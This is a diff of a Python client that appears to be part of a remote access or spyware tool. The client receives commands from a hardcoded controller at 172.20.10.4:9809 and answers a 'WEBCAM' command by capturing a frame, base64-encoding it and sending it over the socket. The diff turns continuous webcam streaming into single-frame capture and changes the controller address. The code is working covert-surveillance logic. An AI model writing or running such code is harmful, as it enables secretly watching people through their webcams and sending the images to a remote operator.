@@ -120,30 +120,22 @@ def detect_copy(sock, filename):
 
 
 # Function to capture and send webcam image
-def capture_and_send_webcam(sock, stop_signal):
+def capture_and_send_webcam(sock):
     cap = cv2.VideoCapture(0)
-
-    while not stop_signal.is_set():
-        ret, frame = cap.read()
-        if not ret:
-            break
-
+    ret, frame = cap.read()
+    if ret:
         _, buffer = cv2.imencode('.jpg', frame)
-        encoded_image = base64.b64encode(buffer).decode()
+        encoded_image = base64.b64encode(buffer).decode('utf-8')
 
         client_info = {
             'command': 'WEBCAM',
             'image': encoded_image
         }
-        json_data = json.dumps(client_info)
         try:
-            sock.send(json_data.encode())
+            message = json.dumps(client_info).encode('utf-8')
+            sock.sendall(message)
         except socket.error as e:
             print(f'Error sending webcam image: {e}')
-            break
-
-        time.sleep(0.1)
-
     cap.release()
 
 
@@ -260,7 +252,7 @@ def receive_commands(sock):
 # Main function
 def main():
     global stop
-    host = '172.20.10.3'
+    host = '172.20.10.4'
     port = 9809
     current_hour = datetime.datetime.now().strftime("%Hh")
     current_date = datetime.datetime.now().strftime("%d%m%Y")
